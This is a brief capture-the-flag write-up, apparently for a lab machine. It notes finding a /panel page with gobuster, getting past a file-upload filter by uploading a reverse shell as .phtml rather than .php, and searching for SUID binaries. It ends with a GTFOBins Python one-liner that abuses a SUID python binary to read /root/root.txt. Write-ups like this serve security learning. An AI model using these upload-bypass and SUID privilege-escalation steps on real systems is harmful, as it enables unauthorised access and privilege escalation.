```bash
export IP=10.10.172.129
```

# Gobuster

There is a /panel on the site

# File upload vilnurability

.php is not permited, so I tried .phtml and reverse shell revers.phtml

# User flag

```bash
find / -name "user.txt"
```
This gave me /var/www/user.txt

# SUID

```bash
find / -perm /4000 2>/dev/null
```

`/usr/bin/python` is interesting

# Pyhton

Just used GTFOBins 

```bash
python -c 'print(open("/root/root.txt").read())'
```